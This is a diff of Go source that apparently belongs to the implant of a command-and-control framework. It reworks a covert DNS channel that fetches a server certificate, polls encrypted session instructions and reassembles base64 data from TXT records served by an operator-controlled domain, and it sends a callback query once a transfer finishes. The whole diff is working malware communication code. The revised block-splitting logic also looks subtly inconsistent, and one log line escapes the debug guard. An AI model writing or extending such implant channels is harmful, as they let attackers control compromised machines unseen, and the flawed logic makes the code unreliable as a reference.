@@ -46,7 +46,7 @@ const (
 
 	blockIDSize = 6
 
-	maxFetchTxts = 200 // How many txts to request at a time
+	maxBlocksPerTXT = 200 // How many blocks to put into a TXT resp at a time
 )
 
 var (
@@ -61,14 +61,14 @@ var (
 // RecvBlock - Single block from server
 type RecvBlock struct {
 	Index int
-	Data  []byte
+	Data  string
 }
 
 // BlockReassembler - Data is encoded and split into `Blocks`
 type BlockReassembler struct {
 	ID   string
 	Size int
-	Recv chan RecvBlock
+	Recv chan *RecvBlock
 }
 
 // Basic message replay protect, hash the cipher text and store it in a map
@@ -266,28 +266,22 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	selector = strings.ToLower(selector)
 	nonce := dnsNonce(nonceStdSize)
 	domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeyMsg, parentDomain)
-	// {{if .Debug}}
-	log.Printf("[dns] lookup -> %s", domain)
-	// {{end}}
-	txts, err := net.LookupTXT(domain)
+
+	txt, err := dnsLookup(domain)
 	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Error fetching server certificate %v", err)
+		// {{end}}
 		return nil, err
 	}
-	// {{if .Debug}}
-	log.Printf("txts = %v err = %v", txts, err)
-	// {{end}}
-	if len(txts) == 0 {
-		return nil, errors.New("Invalid _domainkey response")
+	certPEM, err := base64.RawStdEncoding.DecodeString(txt)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Error decoding certificate %v", err)
+		// {{end}}
+		return nil, err
 	}
-
-	fields := strings.Split(txts[0], ".")
-	if len(fields) < 2 {
-		return nil, errors.New("Invalid _domainkey response")
-	}
-	// {{if .Debug}}
-	log.Printf("Fetching Block ID = %s (Size = %s)", fields[0], fields[1])
-	// {{end}}
-	return getBlock(parentDomain, fields[0], fields[1])
+	return certPEM, nil
 }
 
 // --------------------------- DNS SESSION SEND ---------------------------
@@ -328,9 +322,6 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 		case <-time.After(pollInterval):
 			nonce := dnsNonce(nonceStdSize)
 			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
-			// {{if .Debug}}
-			log.Printf("[dns] lookup -> %s", domain)
-			// {{end}}
 			txt, err := dnsLookup(domain)
 			if err != nil {
 				// {{if .Debug}}
@@ -340,14 +331,21 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			if txt == "0" {
 				continue
 			}
+			log.Printf("Poll returned new block(s): %#v", txt)
 
 			rawTxt, _ := base64.RawStdEncoding.DecodeString(txt)
 			pollData, err := GCMDecrypt(sessionKey, rawTxt)
+			if err != nil {
+				// {{if .Debug}}
+				log.Printf("Failed to decrypt poll response")
+				// {{end}}
+				break
+			}
 			dnsPoll := &pb.DNSPoll{}
 			err = proto.Unmarshal(pollData, dnsPoll)
 			if err != nil {
 				// {{if .Debug}}
-				log.Printf("Invalid _sp response")
+				log.Printf("Invalid poll response")
 				// {{end}}
 				break
 			}
@@ -376,7 +374,7 @@ func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNS
 	envelopeData, err := GCMDecrypt(sessionKey, blockData)
 	if err != nil {
 		// {{if .Debug}}
-		log.Printf("Failed to decrypt block with id = %s", blockPtr.Id)
+		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.Id, err)
 		// {{end}}
 		return nil
 	}
@@ -400,21 +398,25 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 	reasm := &BlockReassembler{
 		ID:   blockID,
 		Size: n,
-		Recv: make(chan RecvBlock, n),
+		Recv: make(chan *RecvBlock, n),
 	}
+
+	// How many TXT records do we need to fetch?
+	txtRecords := int(math.Ceil(float64(n) / float64(maxBlocksPerTXT)))
 
 	var wg sync.WaitGroup
-	data := make([][]byte, reasm.Size)
+	data := make([]string, txtRecords)
 
-	fetchTxts := maxFetchTxts
-	if reasm.Size < maxFetchTxts {
-		fetchTxts = reasm.Size
-	}
-
-	for index := 0; index < reasm.Size; index += fetchTxts {
+	for index := 0; index < txtRecords; index++ {
 		wg.Add(1)
-		go fetchRecvBlock(parentDomain, reasm, index, index+fetchTxts, &wg)
+		start := index * maxBlocksPerTXT
+		stop := start + maxBlocksPerTXT
+		if txtRecords < stop {
+			stop = txtRecords
+		}
+		go fetchBlockSegments(parentDomain, reasm, index, start, stop, &wg)
 	}
+
 	done := make(chan bool)
 	go func() {
 		for block := range reasm.Recv {
@@ -426,10 +428,19 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 	close(reasm.Recv)
 	<-done // Avoid race where range of reasm.Recv isn't complete
 
-	msg := []byte{}
+	msg := []string{}
 	for _, buf := range data {
-		msg = append(msg, buf...)
+		msg = append(msg, buf)
 	}
+
+	msgData, err := base64.RawStdEncoding.DecodeString(strings.Join(msg, ""))
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to decode block")
+		// {{end}}
+		return nil, errors.New("Failed to decode block")
+	}
+
 	nonce := dnsNonce(nonceStdSize)
 	go func() {
 		domain := fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain)
@@ -438,61 +449,30 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 		// {{end}}
 		net.LookupTXT(domain)
 	}()
-	return msg, nil
+
+	return msgData, nil
 }
 
 // Fetch a single block
-func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
+func fetchBlockSegments(parentDomain string, reasm *BlockReassembler, index int, start int, stop int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	nonce := dnsNonce(nonceStdSize)
 	domain := fmt.Sprintf("_%s.%d.%d.%s.%s.%s", nonce, start, stop, reasm.ID, blockReqMsg, parentDomain)
 	// {{if .Debug}}
 	log.Printf("[dns] fetch -> %s", domain)
 	// {{end}}
-	txts, err := net.LookupTXT(domain)
-	// {{if .Debug}}
-	log.Printf("[dns] fetched %d txt record(s)", len(txts))
-	// {{end}}
+	txt, err := dnsLookup(domain)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("Failed to fetch blocks %v", err)
 		// {{end}}
 		return
 	}
-	for _, txt := range txts {
-		// Split on delim '.' because Windows strcat's multiple TXT records
-		for _, record := range strings.Split(txt, ".") {
-			if len(record) == 0 {
-				continue
-			}
-			// {{if .Debug}}
-			log.Printf("Decoding TXT record: %s", record)
-			// {{end}}
-			rawBlock, err := base64.RawStdEncoding.DecodeString(record)
-			if err != nil {
-				// {{if .Debug}}
-				log.Printf("Failed to decode raw block '%s'", rawBlock)
-				// {{end}}
-				continue
-			}
-			if len(rawBlock) < 4 {
-				// {{if .Debug}}
-				log.Printf("Invalid raw block size %d", len(rawBlock))
-				// {{end}}
-				continue
-			}
-			seqBuf := make([]byte, 4)
-			copy(seqBuf, rawBlock[:4])
-			seq := int(binary.LittleEndian.Uint32(seqBuf))
-			// {{if .Debug}}
-			log.Printf("seq = %d (%d bytes)", seq, len(rawBlock[4:]))
-			// {{end}}
-			reasm.Recv <- RecvBlock{
-				Index: seq,
-				Data:  rawBlock[4:],
-			}
-		}
+	reasm.Recv <- &RecvBlock{
+		Index: index,
+		Data:  txt,
 	}
+
 }
 
 // --------------------------- HELPERS ---------------------------
